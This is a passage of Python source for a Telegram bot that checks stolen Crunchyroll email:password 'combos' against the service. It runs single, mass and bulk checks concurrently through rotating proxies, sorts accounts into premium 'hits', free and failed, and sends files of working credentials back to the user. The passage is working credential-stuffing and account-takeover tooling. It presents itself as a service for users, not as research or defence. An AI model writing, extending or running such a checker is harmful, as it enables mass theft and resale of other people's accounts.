    await safe_delete_message(ctx.bot, update.effective_chat.id, q.message.message_id)
    task = asyncio.create_task(run_combos_check(update, ctx, combos, uid))
    running_tasks[uid] = task
    try:
        await task
    except Exception as e:
        logger.error(f"auto bulk check failed: {e}")
        await safe_send_message(ctx.bot, update.effective_chat.id,
            text=f"{DIV}\n  <b>✗  CHECK FAILED</b>\n{DIV}\n\n"
                 f"<b>▸</b> {escape_html(str(e))}\n\n{DIV}"
        )
    finally:
        running_tasks.pop(uid, None)

# ── BULK CHECK ENGINE ─────────────────────────────────────────
async def run_combos_check(update, ctx, combos, uid):
    proxies = get_effective_proxies(uid)
    if not proxies:
        await safe_send_message(ctx.bot, update.effective_chat.id,
            text=f"{DIV}\n  <b>▲  NO PROXY</b>\n{DIV}\n\n"
                 f"<b>▸</b> No proxy available.\n"
                 f"<b>▸</b> Set one with <code>/setproxy</code>.\n\n{DIV}"
        )
        return
    max_ret = get_max_retries(uid)
    max_concurrency = min(DEFAULT_THREADS, MAX_THREADS)

    stop_ev = asyncio.Event()
    checkers = []
    processed = set()
    user_tasks[uid] = {'event': stop_ev, 'checkers': checkers}
    user_bulk_active[uid] = True

    total = len(combos)
    sm = await safe_send_message(ctx.bot, update.effective_chat.id,
        text=f"{DIV}\n  <b>▶  BULK CHECKING</b>\n{DIV}\n\n<b>▸</b> Starting…\n\n{DIV}"
    )
    throttled = ThrottledEditor(sm)
    hits, frees, fails, pfails = [], [], [], []
    checked = 0
    sem = asyncio.Semaphore(max_concurrency)

    last_status = ""
    async def updater():
        nonlocal last_status
        while not stop_ev.is_set() and checked < total:
            await asyncio.sleep(3.0)
            if stop_ev.is_set():
                break
            pct = int((checked / total) * 100) if total else 0
            filled = pct // 10
            bar = "█" * filled + "░" * (10 - filled)
            status = (
                f"{DIV}\n"
                f"  <b>▶  BULK CHECKING</b>\n"
                f"{DIV}\n\n"
                f"<b>▸ Hit</b>       ➜  {len(hits)}\n"
                f"<b>▸ Free</b>      ➜  {len(frees)}\n"
                f"<b>▸ Fail</b>      ➜  {len(fails)}\n"
                f"<b>▸ PxyFail</b>   ➜  {len(pfails)}\n\n"
                f"{SDIV}\n"
                f"<b>▸ Progress</b>  ➜  {checked} / {total}\n"
                f"<code>[{bar}] {pct}%</code>\n\n"
                f"<i>Use /stop to cancel</i>\n\n"
                f"{DIV}"
            )
            if status != last_status:
                await safe_edit_message_text(ctx.bot, update.effective_chat.id, sm.message_id, status, parse_mode=ParseMode.HTML)
                last_status = status

    updater_task = asyncio.create_task(updater())

    async def run_one(idx, email, password):
        nonlocal checked
        if stop_ev.is_set():
            return
        async with sem:
            if stop_ev.is_set():
                return
            checker = CrunchyrollChecker(email, password, proxies.copy(), max_retries=max_ret)
            checkers.append(checker)
            try:
                rt, details, _ = await asyncio.get_running_loop().run_in_executor(
                    executor, checker.check_account)
                checked += 1
                processed.add(idx)
                if rt == 'HIT':
                    hits.append(CrunchyrollChecker("","").fmt_hit_txt(details))
                    update_user_stats(uid, hit=1)
                elif rt == 'FREE':
                    frees.append(CrunchyrollChecker("","").fmt_free_txt(details))
                    update_user_stats(uid, free=1)
                elif rt == 'PROXY_FAIL':
                    pfails.append(CrunchyrollChecker("","").fmt_proxy_fail_txt(details))
                    update_user_stats(uid, proxy_fail=1)
                else:
                    fails.append(CrunchyrollChecker("","").fmt_fail_txt(details))
                    update_user_stats(uid, fail=1)
            except Exception:
                if stop_ev.is_set():
                    return
                checked += 1
                fails.append("Account : unknown\nStatus  : Failed\nReason  : Error")
                update_user_stats(uid, fail=1)
            finally:
                if checker in checkers:
                    checkers.remove(checker)

    tasks = [asyncio.create_task(run_one(i, e, p)) for i, (e, p) in enumerate(combos)]
    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    finally:
        if stop_ev.is_set():
            for t in tasks: t.cancel()
        stop_ev.set()
        updater_task.cancel()
        try:
            await updater_task
        except asyncio.CancelledError:
            pass
        user_tasks.pop(uid, None)
        user_bulk_active[uid] = False
        user_pending_detect.pop(uid, None)

    leftover = [f"{combos[i][0]}:{combos[i][1]}" for i in range(total) if i not in processed]
    if stop_ev.is_set():
        if leftover:
            left_name = f"leftover_{uid}_{int(time.time())}.txt"
            with open(left_name, 'w', encoding='utf-8') as f:
                f.write("\n".join(leftover))
            try:
                with open(left_name, 'rb') as f:
                    await safe_send_document(ctx.bot, update.effective_chat.id, f,
                                             filename=f"leftover_{len(leftover)}.txt",
                                             caption=f"Leftover: {len(leftover)} combos")
            except TimedOut:
                logger.warning("Timeout sending leftover file.")
        final_msg = (
            f"{DIV}\n"
            f"  <b>■  STOPPED</b>\n"
            f"{DIV}\n\n"
            f"<b>▸ Hit</b>      ➜  {len(hits)}\n"
            f"<b>▸ Free</b>     ➜  {len(frees)}\n"
            f"<b>▸ Fail</b>     ➜  {len(fails)}\n"
            f"<b>▸ PxyFail</b>  ➜  {len(pfails)}\n\n"
            f"{SDIV}\n"
            f"<b>▸ Checked</b>  ➜  {checked} / {total}\n\n"
            f"{DIV}\n"
            f"  <i>{COPYRIGHT}</i>\n"
            f"{DIV}"
        )
    else:
        pct = int((checked / total) * 100) if total else 100
        filled = pct // 10
        bar = "█" * filled + "░" * (10 - filled)
        final_msg = (
            f"{DIV}\n"
            f"  <b>◉  COMPLETED</b>\n"
            f"{DIV}\n\n"
            f"<b>▸ Hit</b>      ➜  {len(hits)}\n"
            f"<b>▸ Free</b>     ➜  {len(frees)}\n"
            f"<b>▸ Fail</b>     ➜  {len(fails)}\n"
            f"<b>▸ PxyFail</b>  ➜  {len(pfails)}\n\n"
            f"{SDIV}\n"
            f"<b>▸ Total</b>    ➜  {total}\n"
            f"<code>[{bar}] {pct}%</code>\n\n"
            f"{DIV}\n"
            f"  <i>{COPYRIGHT}</i>\n"
            f"{DIV}"
        )
    await safe_edit_message_text(ctx.bot, update.effective_chat.id, sm.message_id, final_msg, parse_mode=ParseMode.HTML)

    ts = int(time.time())
    for name, data in [("HITS", hits), ("FREE", frees), ("FAILS", fails), ("PROXY_FAILS", pfails)]:
        if data:
            fname = f"{name}_{len(data)}_{ts}.txt"
            with open(fname, 'w', encoding='utf-8') as f:
                f.write(f"Crunchyroll {name}\n{'='*50}\nTotal: {len(data)}\n{'='*50}\n\n")
                f.write("\n\n------------\n\n".join(data))
            try:
                with open(fname, 'rb') as f:
                    await safe_send_document(ctx.bot, update.effective_chat.id, f,
                                             filename=f"{name}_{len(data)}.txt",
                                             caption=f"{name}: {len(data)}")
            except TimedOut:
                logger.warning(f"Timeout sending {name} file.")

# ── COMMANDS ─────────────────────────────────────────────────
@require_channel
async def check_cmd(update, ctx):
    uid = update.effective_user.id
    if is_user_check_busy(uid):
        await _reply(update,
            f"{DIV}\n  <b>▲  BUSY</b>\n{DIV}\n\n"
            f"<b>▸</b> A check is already running.\n"
            f"<b>▸</b> Use <code>/stop</code> to cancel it first.\n\n{DIV}"
        )
        return
    text = ' '.join(ctx.args) if ctx.args else (
        update.message.reply_to_message.text if update.message.reply_to_message else None)
    if not text:
        await _reply(update,
            f"{DIV}\n  <b>◎  USAGE</b>\n{DIV}\n\n"
            f"<b>▸</b> <code>/check email:pass</code>\n"
            f"<b>▸</b> Or reply to a message containing a combo.\n\n{DIV}"
        )
        return
    combos = extract_combos(text)
    if not combos:
        await _reply(update,
            f"{DIV}\n  <b>✗  NOT FOUND</b>\n{DIV}\n\n"
            f"<b>▸</b> No valid email:pass found.\n\n{DIV}"
        )
        return
    u, p = combos[0]
    proxies = get_effective_proxies(uid)
    if not proxies:
        await _reply(update,
            f"{DIV}\n  <b>▲  NO PROXY</b>\n{DIV}\n\n"
            f"<b>▸</b> Set a proxy first with <code>/setproxy</code>.\n\n{DIV}"
        )
        return
    wait = await safe_reply_text(update.effective_message,
        f"{DIV}\n  <b>◎  CHECKING</b>\n{DIV}\n\n"
        f"<b>▸</b> Please wait…\n\n{DIV}",
        parse_mode=ParseMode.HTML
    )
    async def run():
        checker = CrunchyrollChecker(u, p, proxies.copy(), max_retries=get_max_retries(uid))
        user_tasks[uid] = {'event': None, 'checkers': [checker]}
        user_bulk_active[uid] = True
        try:
            rt, details, report = await asyncio.get_running_loop().run_in_executor(executor, checker.check_account)
            if rt == 'HIT':   update_user_stats(uid, hit=1)
            elif rt == 'FREE': update_user_stats(uid, free=1)
            elif rt == 'PROXY_FAIL': update_user_stats(uid, proxy_fail=1)
            else: update_user_stats(uid, fail=1)
            await safe_edit_message_text(ctx.bot, wait.chat_id, wait.message_id, report, parse_mode=ParseMode.HTML)
        except Exception as e:
            await safe_edit_message_text(ctx.bot, wait.chat_id, wait.message_id,
                f"{DIV}\n  <b>✗  ERROR</b>\n{DIV}\n\n"
                f"<b>▸</b> {escape_html(str(e))}\n\n{DIV}",
                parse_mode=ParseMode.HTML
            )
        finally:
            user_tasks.pop(uid, None)
            user_bulk_active[uid] = False
            user_pending_detect.pop(uid, None)
    asyncio.create_task(run())

@require_channel
async def bulk_cmd(update, ctx):
    uid = update.effective_user.id
    if is_user_check_busy(uid):
        await _reply(update,
            f"{DIV}\n  <b>▲  BUSY</b>\n{DIV}\n\n"
            f"<b>▸</b> A check is already running. Use <code>/stop</code> first.\n\n{DIV}"
        )
        return
    if not update.message.reply_to_message or not update.message.reply_to_message.document:
        await _reply(update,
            f"{DIV}\n  <b>◎  USAGE</b>\n{DIV}\n\n"
            f"<b>▸</b> Reply to a <code>.txt</code> file with <code>/bulk</code>\n\n{DIV}"
        )
        return
    doc = update.message.reply_to_message.document
    if not doc.file_name.lower().endswith('.txt'):
        await _reply(update,
            f"{DIV}\n  <b>✗  ERROR</b>\n{DIV}\n\n"
            f"<b>▸</b> Only <code>.txt</code> files are supported.\n\n{DIV}"
        )
        return
    wait_msg = await safe_reply_text(update.effective_message,
        f"{DIV}\n  <b>◎  LOADING</b>\n{DIV}\n\n<b>▸</b> Please wait…\n\n{DIV}",
        parse_mode=ParseMode.HTML
    )
    try:
        content = await download_file_with_retries(ctx, doc.file_id, timeout=600)
    except Exception as e:
        await safe_edit_message_text(ctx.bot, wait_msg.chat_id, wait_msg.message_id,
            f"{DIV}\n  <b>✗  DOWNLOAD ERROR</b>\n{DIV}\n\n"
            f"<b>▸</b> Could not download file. Please try again.\n\n{DIV}",
            parse_mode=ParseMode.HTML
        )
        return

    combos = extract_combos(content)
    unique = list(dict.fromkeys(combos))
    if uid not in admin_ids and len(unique) > MAX_BULK_LINES:
        await safe_edit_message_text(ctx.bot, wait_msg.chat_id, wait_msg.message_id,
            f"{DIV}\n  <b>▲  FILE TOO LARGE</b>\n{DIV}\n\n"
            f"<b>▸ Found</b>    ➜  {len(unique)} combos\n"
            f"<b>▸ Allowed</b>  ➜  {MAX_BULK_LINES} max\n\n"
            f"<b>▸</b> Use <code>/split {MAX_BULK_LINES}</code> to split first.\n\n{DIV}",
            parse_mode=ParseMode.HTML
        )
        return
    if not unique:
        await safe_edit_message_text(ctx.bot, wait_msg.chat_id, wait_msg.message_id,
            f"{DIV}\n  <b>✗  EMPTY</b>\n{DIV}\n\n<b>▸</b> No valid combos found.\n\n{DIV}",
            parse_mode=ParseMode.HTML
        )
        return
    removed = len(combos) - len(unique)
    removed_note = f"<b>▸</b> {removed} duplicates removed.\n" if removed else ""
    await safe_edit_message_text(ctx.bot, wait_msg.chat_id, wait_msg.message_id,
        f"{DIV}\n  <b>◎  PREPARING</b>\n{DIV}\n\n"
        f"{removed_note}"
        f"<b>▸</b> Starting check on {len(unique)} combos…\n\n{DIV}",
        parse_mode=ParseMode.HTML
    )
    await safe_delete_message(ctx.bot, wait_msg.chat_id, wait_msg.message_id)
    task = asyncio.create_task(run_combos_check(update, ctx, unique, uid))
    running_tasks[uid] = task
    try:
        await task
    except Exception as e:
        logger.error(f"bulk check failed: {e}")
        await safe_send_message(ctx.bot, update.effective_chat.id,
            text=f"{DIV}\n  <b>✗  CHECK FAILED</b>\n{DIV}\n\n"
                 f"<b>▸</b> {escape_html(str(e))}\n\n{DIV}"
        )
    finally:
        running_tasks.pop(uid, None)

@require_channel
async def mcheck_cmd(update, ctx):
    uid = update.effective_user.id
    if is_user_check_busy(uid):
        await _reply(update,
            f"{DIV}\n  <b>▲  BUSY</b>\n{DIV}\n\n"
            f"<b>▸</b> A check is already running. Use <code>/stop</code> first.\n\n{DIV}"
        )
        return
    text = ' '.join(ctx.args) if ctx.args else (
        update.message.reply_to_message.text if update.message.reply_to_message else None)
    if not text:
        await _reply(update,
            f"{DIV}\n  <b>◎  USAGE</b>\n{DIV}\n\n"
            f"<b>▸</b> <code>/mcheck email:pass ...</code>  (max {MAX_MASS_CHECK})\n\n{DIV}"
        )
        return
    wait_msg = await safe_reply_text(update.effective_message,
        f"{DIV}\n  <b>◎  LOADING</b>\n{DIV}\n\n<b>▸</b> Please wait…\n\n{DIV}",
        parse_mode=ParseMode.HTML
    )
    combos = extract_combos(text)
    if not combos:
        await safe_edit_message_text(ctx.bot, wait_msg.chat_id, wait_msg.message_id,
            f"{DIV}\n  <b>✗  EMPTY</b>\n{DIV}\n\n<b>▸</b> No combos found.\n\n{DIV}"
        )
        return
    if len(combos) > MAX_MASS_CHECK:
        await safe_edit_message_text(ctx.bot, wait_msg.chat_id, wait_msg.message_id,
            f"{DIV}\n  <b>▲  LIMIT</b>\n{DIV}\n\n"
            f"<b>▸</b> Maximum is {MAX_MASS_CHECK} combos per mass check.\n\n{DIV}"
        )
        return
    unique = list(dict.fromkeys(combos))
    removed = len(combos) - len(unique)
    removed_note = f"<b>▸</b> {removed} duplicates removed.\n" if removed else ""
    await safe_edit_message_text(ctx.bot, wait_msg.chat_id, wait_msg.message_id,
        f"{DIV}\n  <b>▦  MASS CHECK STARTING</b>\n{DIV}\n\n"
        f"{removed_note}"
        f"<b>▸</b> Checking {len(unique)} combos…\n\n{DIV}",
        parse_mode=ParseMode.HTML
    )

    proxies = get_effective_proxies(uid)
    if not proxies:
        await safe_edit_message_text(ctx.bot, wait_msg.chat_id, wait_msg.message_id,
            f"{DIV}\n  <b>▲  NO PROXY</b>\n{DIV}\n\n"
            f"<b>▸</b> Set a proxy first with <code>/setproxy</code>.\n\n{DIV}"
        )
        return
    max_ret = get_max_retries(uid)
    max_concurrency = min(DEFAULT_THREADS, MAX_THREADS)

    stop_ev = asyncio.Event()
    checkers = []
    processed = set()
    user_tasks[uid] = {'event': stop_ev, 'checkers': checkers}
    user_bulk_active[uid] = True

    total = len(unique)
    throttled = ThrottledEditor(wait_msg)
    results = []
    checked = 0
    sem = asyncio.Semaphore(max_concurrency)

    async def run_one(idx, email, password):
        nonlocal checked, results
        if stop_ev.is_set():
            return
        async with sem:
            if stop_ev.is_set():
                return
            checker = CrunchyrollChecker(email, password, proxies.copy(), max_retries=max_ret)
            checkers.append(checker)
            try:
                rt, details, _ = await asyncio.get_running_loop().run_in_executor(
                    executor, checker.check_account
                )
                checked += 1
                processed.add(idx)
                e_acc = escape_html(f"{details['email']}:{details['password']}")
                account = f"Account : {e_acc}"
                if rt == 'HIT':
                    results.append(('HIT', account, "Status  : Premium (Hit)"))
                    update_user_stats(uid, hit=1)
                elif rt == 'FREE':
                    results.append(('FREE', account, "Status  : Free Tier"))
                    update_user_stats(uid, free=1)
                elif rt == 'PROXY_FAIL':
                    results.append(('PROXY_FAIL', account, "Status  : Proxy Error"))
                    update_user_stats(uid, proxy_fail=1)
                else:
                    reason = escape_html(details.get('fail_reason', 'Unknown'))
                    results.append(('FAIL', account, f"Status  : Failed — {reason}"))
                    update_user_stats(uid, fail=1)
            except Exception:
                if stop_ev.is_set():
                    return
                checked += 1
                results.append(('FAIL', 'Account : unknown', 'Status  : Error'))
                update_user_stats(uid, fail=1)
            finally:
                if checker in checkers:
                    checkers.remove(checker)

            pct = int((checked / total) * 100) if total else 0
            status = (
                f"{DIV}\n  <b>▦  MASS CHECK</b>\n{DIV}\n\n"
                f"<b>▸ Checked</b>  ➜  {checked} / {total}  ({pct}%)\n\n{DIV}"
            )
            await throttled.edit(status)

    tasks = [asyncio.create_task(run_one(i, e, p)) for i, (e, p) in enumerate(unique)]
    try:
        await asyncio.gather(*tasks, return_exceptions=True)
    finally:
        if stop_ev.is_set():
            for task in tasks: task.cancel()
        user_tasks.pop(uid, None)
        user_bulk_active[uid] = False

    hit_blocks   = [f"[ HIT ]\n{acc}\n{resp}\n" for typ, acc, resp in results if typ == 'HIT']
    free_blocks  = [f"[ FREE ]\n{acc}\n{resp}\n" for typ, acc, resp in results if typ == 'FREE']
    fail_blocks  = [f"[ FAIL ]\n{acc}\n{resp}\n" for typ, acc, resp in results if typ == 'FAIL']
    proxy_blocks = [f"[ PROXY FAIL ]\n{acc}\n{resp}\n" for typ, acc, resp in results if typ == 'PROXY_FAIL']

    final_msg = (
        f"{DIV}\n"
        f"  <b>▦  MASS CHECK RESULTS</b>\n"
        f"{DIV}\n\n"
    )
    final_msg += "".join(hit_blocks)
    final_msg += "".join(free_blocks)
    final_msg += "".join(fail_blocks)
    final_msg += "".join(proxy_blocks)

    if stop_ev.is_set():
        leftover = [f"{unique[i][0]}:{unique[i][1]}" for i in range(total) if i not in processed]
        if leftover:
            left_name = f"leftover_mass_{uid}_{int(time.time())}.txt"
            with open(left_name, 'w', encoding='utf-8') as f:
                f.write("\n".join(leftover))
            try:
                with open(left_name, 'rb') as f:
                    await safe_send_document(ctx.bot, update.effective_chat.id, f,
                                             filename=f"leftover_{len(leftover)}.txt",
                                             caption=f"Leftover combos: {len(leftover)}")
            except TimedOut:
                logger.warning("Timeout sending mass leftover file.")
        final_msg += f"\n{SDIV}\n<b>■</b> Stopped by user.\n"

    final_msg += f"\n{DIV}\n  <i>{COPYRIGHT}</i>\n{DIV}"

    try:
        if len(final_msg) > 4000:
            await safe_delete_message(ctx.bot, wait_msg.chat_id, wait_msg.message_id)
            for i in range(0, len(final_msg), 4000):
                await safe_send_message(ctx.bot, wait_msg.chat_id, final_msg[i:i+4000], parse_mode=ParseMode.HTML)
        else:
            await safe_edit_message_text(ctx.bot, wait_msg.chat_id, wait_msg.message_id, final_msg, parse_mode=ParseMode.HTML)
    except Exception:
        try: await safe_delete_message(ctx.bot, wait_msg.chat_id, wait_msg.message_id)
        except: pass
        if len(final_msg) > 4000:
            for i in range(0, len(final_msg), 4000):
                await safe_send_message(ctx.bot, wait_msg.chat_id, final_msg[i:i+4000], parse_mode=ParseMode.HTML)
        else:
            await safe_send_message(ctx.bot, wait_msg.chat_id, final_msg, parse_mode=ParseMode.HTML)

@require_channel
async def stop_cmd(update, ctx):
    uid = update.effective_user.id
    user_bulk_active[uid] = False
    user_pending_detect.pop(uid, None)
    task = user_tasks.pop(uid, None)
    if task is None:
        await _reply(update,
            f"{DIV}\n  <b>▲  NOTHING RUNNING</b>\n{DIV}\n\n"
            f"<b>▸</b> No active check to stop.\n\n{DIV}"
        )
        return
    if isinstance(task, dict) and 'checkers' in task:
        for c in task['checkers']:
            try: c.stop()
            except: pass
        if task.get('event'):
            task['event'].set()
    await _reply(update,
        f"{DIV}\n  <b>■  STOPPED</b>\n{DIV}\n\n"
        f"<b>▸</b> Check stopped successfully.\n\n"
        f"{DIV}\n  <i>{COPYRIGHT}</i>\n{DIV}"
    )

# ── PROXY COMMANDS ───────────────────────────────────────────
@require_channel
async def setproxy_cmd(update, ctx):
    uid = update.effective_user.id
    existing = user_proxies.get(uid, [])
    existing_set = set(existing)

    new_raw = []
    if update.message.reply_to_message and update.message.reply_to_message.document:
        doc = update.message.reply_to_message.document
        if not doc.file_name.lower().endswith('.txt'):
            await _reply(update,
                f"{DIV}\n  <b>✗  ERROR</b>\n{DIV}\n\n"
                f"<b>▸</b> Only <code>.txt</code> files are supported.\n\n{DIV}"
            )
            return
        try:
            file = await ctx.bot.get_file(doc.file_id, read_timeout=60)
            content = (await file.download_as_bytearray()).decode('utf-8')
            new_raw = [l.strip() for l in content.split('\n') if l.strip()]
        except Exception as e:
            await _reply(update,
                f"{DIV}\n  <b>✗  ERROR</b>\n{DIV}\n\n<b>▸</b> {escape_html(str(e))}\n\n{DIV}"
            )
            return
    elif ctx.args:
        new_raw = list(ctx.args)
    else:
        await _reply(update,
            f"{DIV}\n"
            f"  <b>◈  SETPROXY USAGE</b>\n"
            f"{DIV}\n\n"
            f"<b>▸ Formats supported:</b>\n"
            f"  <code>ip:port</code>\n"
            f"  <code>ip:port:user:pass</code>\n"
            f"  <code>http://user:pass@ip:port</code>\n\n"
            f"{SDIV}\n"
            f"<b>▸ Examples:</b>\n"
            f"  <code>/setproxy 1.2.3.4:8080</code>\n"
            f"  <code>/setproxy 1.2.3.4:8080:user:pass</code>\n\n"
            f"<b>▸</b> Or reply to a <code>.txt</code> file with <code>/setproxy</code>\n\n"
            f"{DIV}\n"
            f"  <i>{COPYRIGHT}</i>\n"
            f"{DIV}"
        )
        return

    if not new_raw:
        await _reply(update,
            f"{DIV}\n  <b>▲  EMPTY</b>\n{DIV}\n\n<b>▸</b> No proxies provided.\n\n{DIV}"
        )
        return

    parsed_new = []
    duplicates = 0
    for raw in new_raw:
        pu = parse_proxy_input(raw)
        if pu:
            if pu not in existing_set:
                parsed_new.append(pu)
            else:
                duplicates += 1

    if not parsed_new and duplicates > 0:
        await _reply(update,
            f"{DIV}\n  <b>↻  ALL DUPLICATES</b>\n{DIV}\n\n"
            f"<b>▸</b> All {duplicates} proxies already exist.\n\n{DIV}"
        )
        return

    sm = await safe_reply_text(update.effective_message,
        f"{DIV}\n  <b>◈  TESTING PROXIES</b>\n{DIV}\n\n"
        f"<b>▸</b> Testing {len(parsed_new)} new proxies…\n\n{DIV}",
        parse_mode=ParseMode.HTML
    )
    working_new = []
    failed_count = 0
    total_new = len(parsed_new)
    sem = asyncio.Semaphore(PROXY_TEST_CONCURRENCY)
    tested = 0
    lock = asyncio.Lock()
    last_ui_update = 0
    last_db_save = time.monotonic()
    db_save_count = 0

    async def maybe_ui_update(force=False):
        nonlocal last_ui_update
        now = time.monotonic()
        if force or now - last_ui_update >= PROXY_UI_UPDATE_INTERVAL:
            try:
                await safe_edit_message_text(ctx.bot, sm.chat_id, sm.message_id,
                    f"{DIV}\n  <b>◈  TESTING PROXIES</b>\n{DIV}\n\n"
                    f"<b>▸ Tested</b>   ➜  {tested} / {total_new}\n"
                    f"<b>▸ Added</b>    ➜  {len(working_new)}\n"
                    f"<b>▸ Failed</b>   ➜  {failed_count}\n"
                    f"<b>▸ Total</b>    ➜  {len(user_proxies.get(uid, []))}\n\n{DIV}"
                )
                last_ui_update = now
            except Exception:
                pass

    async def maybe_save_db():
        nonlocal last_db_save, db_save_count
        now = time.monotonic()
        if (db_save_count >= PROXY_DB_SAVE_BATCH) or (now - last_db_save >= PROXY_DB_SAVE_INTERVAL):
            save_user_proxies(uid, user_proxies.get(uid, []))
            last_db_save = now
            db_save_count = 0

    async def test_and_add(proxy_url):
        nonlocal tested, failed_count, working_new, db_save_count
        async with sem:
            ok = await test_proxy_health(proxy_url)
            async with lock:
                tested += 1
                if ok:
                    working_new.append(proxy_url)
                    if uid not in user_proxies:
                        user_proxies[uid] = []
                    user_proxies[uid].append(proxy_url)
                    db_save_count += 1
                else:
                    failed_count += 1
                await maybe_ui_update()
                await maybe_save_db()

    tasks = [asyncio.create_task(test_and_add(p)) for p in parsed_new]
    await asyncio.gather(*tasks)

    save_user_proxies(uid, user_proxies.get(uid, []))
    await maybe_ui_update(force=True)

    dup_note   = f"<b>▸ Skipped</b>   ➜  {duplicates} duplicates\n" if duplicates else ""
    fail_note  = f"<b>▸ Failed</b>    ➜  {failed_count} proxies\n" if failed_count else ""
    await safe_edit_message_text(ctx.bot, sm.chat_id, sm.message_id,
        f"{DIV}\n"
        f"  <b>◈  PROXY SETUP COMPLETE</b>\n"
        f"{DIV}\n\n"
        f"<b>▸ Added</b>    ➜  {len(working_new)} proxies\n"
        f"{dup_note}"
        f"{fail_note}"
        f"<b>▸ Total</b>    ➜  {len(user_proxies.get(uid, []))} proxies\n\n"
        f"{DIV}\n"
        f"  <i>{COPYRIGHT}</i>\n"
        f"{DIV}"
    )

@require_channel
async def delproxy_cmd(update, ctx):
    uid = update.effective_user.id
    personal = user_proxies.get(uid, [])
    if not personal:
        await _reply(update,
            f"{DIV}\n  <b>▲  EMPTY</b>\n{DIV}\n\n"
            f"<b>▸</b> You have no personal proxies to delete.\n\n{DIV}"
        )
        return

    args = ctx.args
    if not args:
        await _reply(update,
            f"{DIV}\n"
            f"  <b>◈  DELPROXY USAGE</b>\n"
            f"{DIV}\n\n"
            f"<b>▸</b> <code>/delproxy all</code>  ➜  Remove all proxies\n"
            f"<b>▸</b> <code>/delproxy ip:port</code>  ➜  Remove specific proxy\n\n"
            f"{DIV}\n  <i>{COPYRIGHT}</i>\n{DIV}"
        )
        return

    if args[0].lower() == "all":
        user_proxies[uid] = []
        save_user_proxies(uid, [])
        await _reply(update,
            f"{DIV}\n  <b>◈  PROXIES CLEARED</b>\n{DIV}\n\n"
            f"<b>▸</b> All personal proxies removed.\n\n"
            f"{DIV}\n  <i>{COPYRIGHT}</i>\n{DIV}"
        )
        return

    proxy_text = ' '.join(args)
    target_parsed = parse_proxy_input(proxy_text)
    if not target_parsed:
        await _reply(update,
            f"{DIV}\n  <b>✗  INVALID FORMAT</b>\n{DIV}\n\n"
            f"<b>▸</b> Invalid proxy format.\n"
            f"<b>▸</b> Use: <code>ip:port</code> or <code>ip:port:user:pass</code>\n\n{DIV}"
        )
        return

    try:
        personal.remove(target_parsed)
    except ValueError:
        await _reply(update,
            f"{DIV}\n  <b>✗  NOT FOUND</b>\n{DIV}\n\n"
            f"<b>▸</b> Proxy not in your list:\n"
            f"<code>{escape_html(mask_proxy(target_parsed))}</code>\n\n{DIV}"
        )
        return

    user_proxies[uid] = personal
    save_user_proxies(uid, personal)
    await _reply(update,
        f"{DIV}\n  <b>◈  PROXY REMOVED</b>\n{DIV}\n\n"
        f"<b>▸ Removed</b>  ➜  <code>{escape_html(mask_proxy(target_parsed))}</code>\n"
        f"<b>▸ Remaining</b>  ➜  {len(personal)} proxies\n\n"
        f"{DIV}\n  <i>{COPYRIGHT}</i>\n{DIV}"
    )

# ── BROADCAST ────────────────────────────────────────────────
@require_channel
async def broadcast_cmd(update, ctx):
    if update.effective_user.id != OWNER_ID:
        await _reply(update,
            f"{DIV}\n  <b>◆  ACCESS DENIED</b>\n{DIV}\n\n"
            f"<b>▸</b> Only the owner can broadcast.\n\n{DIV}"
        )
        return

    user_ids = get_all_user_ids()
    if not user_ids:
        await _reply(update,
            f"{DIV}\n  <b>▲  EMPTY</b>\n{DIV}\n\n"
            f"<b>▸</b> No users in database.\n\n{DIV}"
        )
        return

    success = 0
    fail = 0
    status_msg = await safe_reply_text(update.effective_message,
        f"{DIV}\n  <b>▷  BROADCASTING</b>\n{DIV}\n\n"
        f"<b>▸</b> Sending to {len(user_ids)} users…\n\n{DIV}",
        parse_mode=ParseMode.HTML
    )

    if update.message.reply_to_message:
        original = update.message.reply_to_message
        for uid in user_ids:
            try:
                if original.text:
                    await safe_send_message(ctx.bot, uid, original.text, parse_mode=ParseMode.HTML)
                elif original.photo:
                    await safe_send_photo(ctx.bot, uid, original.photo[-1].file_id, caption=original.caption or '')
                elif original.video:
                    await safe_send_video(ctx.bot, uid, original.video.file_id, caption=original.caption or '')
                elif original.document:
                    await safe_send_document(ctx.bot, uid, original.document.file_id, caption=original.caption or '')
                elif original.audio:
                    await safe_send_audio(ctx.bot, uid, original.audio.file_id, caption=original.caption or '')
                elif original.voice:
                    await safe_send_voice(ctx.bot, uid, original.voice.file_id)
                elif original.sticker:
                    await safe_send_sticker(ctx.bot, uid, original.sticker.file_id)
                else:
                    continue
                success += 1
            except Forbidden:
                fail += 1
            except Exception as e:
                logger.warning(f"Broadcast failed for {uid}: {e}")
                fail += 1
            await asyncio.sleep(BROADCAST_DELAY)
    else:
        message_text = ' '.join(ctx.args)
        if not message_text:
            await _reply(update,
                f"{DIV}\n  <b>◎  USAGE</b>\n{DIV}\n\n"
                f"<b>▸</b> <code>/broadcast message</code>\n"
                f"<b>▸</b> Or reply to a message with <code>/broadcast</code>\n\n{DIV}"
            )
            return
        for uid in user_ids:
            try:
                await safe_send_message(ctx.bot, uid,
                    f"{DIV}\n  <b>▷  BROADCAST</b>\n{DIV}\n\n"
                    f"{escape_html(message_text)}\n\n"
                    f"{DIV}\n  <i>{COPYRIGHT}</i>\n{DIV}",
                    parse_mode=ParseMode.HTML
                )
                success += 1
            except Forbidden:
                fail += 1
            except Exception as e:
                logger.warning(f"Broadcast failed for {uid}: {e}")
                fail += 1
            await asyncio.sleep(BROADCAST_DELAY)

    await safe_edit_message_text(ctx.bot, status_msg.chat_id, status_msg.message_id,
        f"{DIV}\n  <b>▷  BROADCAST COMPLETE</b>\n{DIV}\n\n"
        f"<b>▸ Sent</b>    ➜  {success}\n"
        f"<b>▸ Failed</b>  ➜  {fail}\n\n"
        f"{DIV}\n  <i>{COPYRIGHT}</i>\n{DIV}",
        parse_mode=ParseMode.HTML
    )

# ── ADMIN PROXY COMMANDS ─────────────────────────────────────
@require_channel
async def setadminproxy_cmd(update, ctx):
    if update.effective_user.id != OWNER_ID:
        await _reply(update,
            f"{DIV}\n  <b>◆  ACCESS DENIED</b>\n{DIV}\n\n<b>▸</b> Owner only.\n\n{DIV}"
        )
        return
    proxies = []
    if update.message.reply_to_message and update.message.reply_to_message.document:
        doc = update.message.reply_to_message.document
        if not doc.file_name.lower().endswith('.txt'):
            await _reply(update,
                f"{DIV}\n  <b>✗  ERROR</b>\n{DIV}\n\n<b>▸</b> Only <code>.txt</code> files are supported.\n\n{DIV}"
            )
            return
        try:
            file = await ctx.bot.get_file(doc.file_id, read_timeout=60)
